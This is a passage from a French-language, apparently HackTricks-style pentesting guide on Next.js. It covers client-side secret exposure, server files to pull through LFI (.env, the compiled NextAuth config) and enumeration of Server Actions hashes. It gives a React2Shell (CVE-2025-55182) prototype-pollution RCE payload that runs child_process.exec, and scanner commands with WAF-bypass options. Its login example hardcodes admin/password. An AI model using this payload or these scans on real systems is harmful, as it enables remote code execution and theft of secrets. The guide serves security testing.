- **Ne jamais exposer les secrets côté client :** Veiller à ce que les variables sensibles ne soient utilisées que côté serveur.

**Exemple :**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Note:** Pour restreindre les variables au côté serveur uniquement, omettez-les de l'objet `env` ou préfixez-les par `NEXT_PUBLIC_` pour les exposer au client.

### Artéfacts serveur utiles à cibler via des endpoints LFI/de téléchargement

Si vous trouvez un path traversal ou un download API dans une app Next.js, ciblez les artefacts compilés qui leak des secrets côté serveur et la logique d'authentification :

- `.env` / `.env.local` pour les secrets de session et les identifiants des providers.
- `.next/routes-manifest.json` et `.next/build-manifest.json` pour la liste complète des routes.
- `.next/server/pages/api/auth/[...nextauth].js` pour récupérer la configuration NextAuth compilée (contient souvent des mots de passe de fallback lorsque les valeurs `process.env` ne sont pas définies).
- `next.config.js` / `next.config.mjs` pour examiner les rewrites, redirects et le routage middleware.

### Authentification et Autorisation

**Approche :**

- **Authentification basée sur les sessions :** Utilisez les cookies pour gérer les sessions utilisateurs.
- **Authentification par tokens :** Implémentez des JWTs pour une authentification sans état.
- **Fournisseurs tiers :** Intégrez des fournisseurs OAuth (par ex. Google, GitHub) en utilisant des bibliothèques comme `next-auth`.

**Bonnes pratiques de sécurité :**

- **Cookies sécurisés :** Définissez les attributs `HttpOnly`, `Secure` et `SameSite`.
- **Hachage des mots de passe :** Hachez toujours les mots de passe avant de les stocker.
- **Validation des entrées :** Prévenez les attaques par injection en validant et en assainissant les entrées.

**Exemple :**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Optimisation des performances

**Stratégies :**

- **Optimisation des images :** Utilisez le composant `next/image` de Next.js pour l'optimisation automatique des images.
- **Fractionnement du code :** Utilisez les imports dynamiques pour séparer le code et réduire les temps de chargement initiaux.
- **Mise en cache :** Mettez en place des stratégies de cache pour les réponses d'API et les assets statiques.
- **Chargement différé :** Chargez les composants ou les ressources uniquement lorsqu'ils sont nécessaires.

**Exemple :**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Les versions modernes de Next.js utilisent « Server Actions » qui s'exécutent sur le serveur mais sont invoquées depuis le client. En production, ces invocations sont opaques : tous les POSTs aboutissent sur un endpoint commun et sont distingués par un hash spécifique au build envoyé dans l'en-tête `Next-Action`. Exemple:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Lorsque `productionBrowserSourceMaps` est activé, les chunks JS minifiés contiennent des appels à `createServerReference(...)` qui leak suffisamment de structure (plus les source maps associées) pour reconstituer une correspondance entre le hash d'action et le nom de la fonction d'origine. Cela vous permet de traduire les hashes observés dans `Next-Action` en cibles concrètes comme `deleteUserAccount()` ou `exportFinancialData()`.

### Extraction approach (regex on minified JS + optional source maps)

Recherchez dans les chunks JS téléchargés `createServerReference` et extrayez le hash ainsi que le symbole de fonction/source. Deux motifs utiles :
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groupe 1 : hachage d'action serveur (40+ caractères hexadécimaux)
- Groupe 2 : symbole ou chemin pouvant être résolu en le nom de la fonction originale via la source map quand elle est présente

Si le script annonce une source map (commentaire final `//# sourceMappingURL=<...>.map`), récupérez-la et résolvez le symbole/chemin vers le nom de la fonction originale.

### Practical workflow

- Découverte passive lors de la navigation : capturez les requêtes contenant les en-têtes `Next-Action` et les URL des chunks JS.
- Récupérez les bundles JS référencés et les fichiers `*.map` associés (lorsqu'ils sont présents).
- Exécutez la regex ci‑dessus pour construire un dictionnaire hash↔nom.
- Utilisez le dictionnaire pour cibler les tests :
- Triage basé sur le nom (par ex., `transferFunds`, `exportFinancialData`).
- Suivez la couverture entre les builds par nom de fonction (les hashes tournent d'une build à l'autre).

### Exercising hidden actions (template-based request)

Prenez un POST valide observé dans le proxy comme modèle et remplacez la valeur `Next-Action` pour cibler une autre action découverte :
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Relancer dans Repeater et tester l'autorisation, la validation des entrées et la logique métier des actions autrement inaccessibles.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automatise ce qui précède dans Burp :
- Analyse l'historique du proxy pour les chunks JS, extrait les entrées `createServerReference(...)`, et analyse les source maps lorsqu'elles sont disponibles.
- Maintient un dictionnaire consultable hash↔nom de fonction et déduplique entre les builds par nom de fonction.
- Peut localiser un POST template valide et ouvrir un onglet Repeater prêt à envoyer avec le hash de l'action cible remplacé.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Nécessite `productionBrowserSourceMaps` activé en production pour récupérer les noms depuis les bundles/source maps.
- La divulgation de noms de fonction n'est pas une vulnérabilité en soi ; utilisez-la pour orienter la découverte et tester l'autorisation de chaque action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Les déploiements Next.js App Router qui exposent des Server Actions sur `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contiennent une pollution de prototype côté serveur critique lors de la désérialisation de chunks **Flight**. En fabriquant des références `$` dans une payload Flight, un attaquant peut pivoter depuis des prototypes pollués vers l'exécution arbitraire de JavaScript puis vers l'exécution de commandes OS dans le processus Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Chaîne d'attaque dans les chunks Flight

1. **Primitive de pollution de prototype :** Définir `"then": "$1:__proto__:then"` de façon à ce que le résolveur écrive une fonction `then` sur `Object.prototype`. Tout objet littéral traité ensuite devient thenable, permettant à l'attaquant d'influencer le flux de contrôle asynchrone à l'intérieur des internals RSC.
2. **Réaffectation vers le constructeur global `Function` :** Pointer `_response._formData.get` vers `"$1:constructor:constructor"`. Lors de la résolution, `object.constructor` → `Object`, et `Object.constructor` → `Function`, donc les appels futurs à `_formData.get()` exécutent réellement `Function(...)`.
3. **Exécution de code via `_prefix` :** Placer du code JavaScript dans `_response._prefix`. Quand le `_formData.get` pollué est invoqué, le framework évalue `Function(_prefix)(...)`, ainsi le JS injecté peut exécuter `require('child_process').exec()` ou toute autre primitive de Node.

#### Squelette de payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Cartographie de l'exposition des React Server Functions

React Server Functions (RSF) sont toutes les fonctions qui incluent la directive `'use server';`. Chaque form action, mutation, ou fetch helper lié à l'une de ces fonctions devient un RSC Flight endpoint qui désérialisera sans problème des attacker-supplied payloads. Étapes utiles de recon dérivées des évaluations React2Shell :

- **Inventaire statique :** recherchez la directive pour comprendre combien de RSFs sont automatiquement exposées par le framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **Paramètres par défaut de l'App Router :** `create-next-app` active l'App Router + le répertoire `app/` par défaut, ce qui transforme silencieusement chaque route en un endpoint compatible RSC. Les assets de l'App Router tels que `/_next/static/chunks/app/` ou les réponses qui streament des Flight chunks via `text/x-component` sont des empreintes robustes exposées sur Internet.
- **Déploiements RSC implicitement vulnérables :** l’avertissement officiel de React indique que les apps qui embarquent le runtime RSC peuvent être exploitables **même sans RSFs explicites**, donc considérez comme suspect tout build utilisant `react-server-dom-*` 19.0.0–19.2.0.
- **Autres frameworks packagant RSC :** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. réutilisent le même sérialiseur et héritent de la même surface d'attaque distante tant qu'ils n'intègrent pas des builds React patchés.

#### Couverture des versions (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack` : **vulnérable** en 19.0.0, 19.1.0–19.1.1 et 19.2.0 ; **corrigé** en 19.0.1, 19.1.2 et 19.2.1 respectivement.
- **Next.js stable :** les releases App Router 15.0.0–16.0.6 intègrent le stack RSC vulnérable. Les trains de patch 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 incluent des dépendances corrigées, donc tout build inférieur à ces versions est de haute valeur.
- **Next.js canary :** `14.3.0-canary.77+` contient aussi le runtime bogué et manque actuellement de canary drops patchés, faisant de ces empreintes de solides candidats à l'exploitation.

#### Oracle de détection à distance

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) envoie une requête Flight multipart spécialement construite aux chemins candidats et observe le comportement côté serveur :

- **Mode par défaut** exécute un payload RCE déterministe (opération mathématique reflétée via `X-Action-Redirect`) prouvant l'exécution de code.
- **Mode `--safe-check`** malforme volontairement le message Flight pour que les serveurs patchés retournent `200/400`, tandis que les cibles vulnérables émettent des réponses `HTTP/500` contenant la sous-chaîne `E{"digest"` dans le corps. Cette paire `(500 + digest)` est actuellement l'oracle distant le plus fiable publié par les défenseurs.
- Les options intégrées `--waf-bypass`, `--vercel-waf-bypass` et `--windows` ajustent la mise en forme du payload, préfixent des données inutiles, ou remplacent les commandes OS pour que vous puissiez sonder des assets réels sur Internet.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Références

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – Tout ce que vous devez savoir](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
